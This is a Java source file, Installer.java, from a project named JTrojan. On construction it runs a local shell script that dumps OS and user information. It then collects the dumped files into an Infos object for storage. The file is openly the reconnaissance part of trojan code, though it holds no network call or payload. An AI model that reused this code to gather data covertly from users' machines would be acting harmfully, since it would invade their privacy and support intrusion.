/**
 * @Description:        Installer class would to save OS informations into files
 * @Author:             Quentin Le Bian <quentpilot>
 * @Email:              quentin.lebian@pilotaweb.fr
 * @Project:            JTrojan
 * @About:              You're welcome to hack and code as your are each of theses sources files <3:p|--<;
 * @Filename:           Installer.java
 * @Date:               2017-10-19T15:20:14+02:00
 * @Last modified by:   quentpilot
 * @Last modified time: 2017-10-21T12:43:46+02:00
 * @License:            MIT
 * @See:                projects.quentinlebian.fr/JTrojan
 */


package Trojan.Install;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.PrintStream;
import java.io.Reader;
import java.util.Scanner;

import Trojan.Connect.Connection;
import Trojan.Install.Infos;
import Trojan.Tools.Writer;

public class Installer {

  /**
  * This attribute would to store options for Installer
  *
  * @see Installer#getOptions()
  */
  protected String[] options = null;

  /**
  * This attribute would to store script name to execute first
  *
  * @see Installer#getFilename()
  */
  protected String filename = "data.set.sh";

  /**
  * This attribute would to store Process instance to work with it
  *
  * @see Installer#getProcess()
  */
  protected Process process = null;

  /**
  * This attribute would to store current OS infos from file
  *
  * @see Installer#getInfos()
  */
  protected Infos infos = null;

  /**
  * This main constructor would to do nothing
  *
  * @param options
  *                 current Installer options to set
  *
  * @see Installer#Installer(String[] options)
  */
  public Installer(String[] options) {
      this.options = options;
      this.dump();
  }

  /**
  * This method would to execute script
  * to get some OS user infos
  *
  * @see Installer#Installer(String[] options)
  */
  protected void dump() {
      this.exec_script(this.filename);
      Installer.println("*** Dumped infos would be set! ***");
  }

  /**
  * This method would to build Infos class
  * then store data to resources/infos/os.json
  * to get some OS user infos
  *
  * @return Success or not
  *
  * @see Installer#Installer(String[] options)
  */
  public boolean run() {
      Installer.println("### running...");

      try {
          Infos   infos = this.build();
          Writer  writer = new Writer(infos);

          this.infos = infos;
          return true;
      }
      catch (Exception e) {
          e.printStackTrace();
          return false;
      }
  }

  /**
  * This method would to get each file data
  * then create an Infos instance
  *
  * @return Infos class built
  *
  * @see Installer#run()
  */
  protected Infos build() {
      String    string = "resources/dump/";
      File      file = new File(string);
      File[]    arrfile = file.listFiles();
      String[]  arrstring = new String[5];
      Infos     infos = new Infos();
      int       it = 0;

      for (File file2 : arrfile) {
          string = "";
          if (!file2.isFile() || !this.isFormated(string = "resources/dump/" + file2.getName())) continue;
          arrstring[it] = this.getFileData(string);
          ++it;
      }

      infos = new Infos(arrstring);
      if (it <= 4) {
          infos = this.build();
      }
      return infos;
  }

  /**
  * This method would to get file data line by line
  *
  * @param path
  *             filename data to get
  * @return file data
  *
  * @see Installer#build()
  */
  protected String getFileData(String path) {
      try {
          Scanner       scanner = new Scanner(new File(path));
          StringBuilder stringBuilder = new StringBuilder();

          while (scanner.hasNext()) {
              stringBuilder.append(scanner.nextLine());
          }
          return stringBuilder.toString();
      }
      catch (FileNotFoundException f) {
          f.printStackTrace();
          return null;
      }
  }

  /**
  * This method would to execute script
  *
  * @param path
  *             scriptname to execute
  * @return Success or not
  *
  * @see Installer#dump()
  */
  protected boolean exec_script(String path) {
      try {
          Process   process;
          String    script = new String("resources/dump/" + path);
          Runtime   runtime = Runtime.getRuntime();

          this.process = process = runtime.exec(script);
          return true;
      }
      catch (Throwable t) {
          t.printStackTrace();
          return false;
      }
  }

  /**
  * This method would to read and print output
  * of script executed
  *
  * @return Success or not
  *
  * @see Installer#exec_script(String path)
  */
  protected boolean read_script() {
      try {
          StringBuffer    stringBuffer = new StringBuffer();
          BufferedReader  bufferedReader = new BufferedReader(new InputStreamReader(this.process.getInputStream()));
          String          string = "";

          while ((string = bufferedReader.readLine()) != null) {
              stringBuffer.append(string + "\n");
          }
          Installer.println("output: \n" + stringBuffer);
          return true;
      }
      catch (Throwable t) {
          t.printStackTrace();
          return false;
      }
  }

  /**
  * This method would to check if current filename is well formated
  *
  * @param string
  *             scriptname to execute
  * @return Success or not
  *
  * @see Installer#dump()
  */
  protected boolean isFormated(String string) {
      String[]    arrstring = string.split("\\.");

      if (string.equals(this.filename)) {
          return false;
      }
      for (String string2 : arrstring) {
          if (!string2.equals("data")) continue;
          return true;
      }
      return false;
  }

  /**
  * This method would to print a string to STDOUT
  *
  * @param text
  *             string to print
  *
  * @see Installer#read_script()
  */
  public static void println(String text) {
      System.out.println(text);
  }

  /**
  * This method would to set options attribute
  *
  * @param options
  *             string to print
  *
  * @see Installer#options
  */
  public void setOptions(String[] options) {
      this.options = options;
  }

  /**
  * This method would to get options attribute
  *
  * @return options value
  *
  * @see Installer#options
  */
  public String[] getOptions() {
      return this.options;
  }

  /**
  * This method would to get filename attribute
  *
  * @return filename value
  *
  * @see Installer#filename
  */
  public String getFilename() {
      return this.filename;
  }

  /**
  * This method would to get process attribute
  *
  * @return process value
  *
  * @see Installer#process
  */
  public Process getProcess() {
      return this.process;
  }

  /**
  * This method would to get infos attribute
  *
  * @return infos value
  *
  * @see Installer#infos
  */
  public Infos getInfos() {
      return this.infos;
  }
}
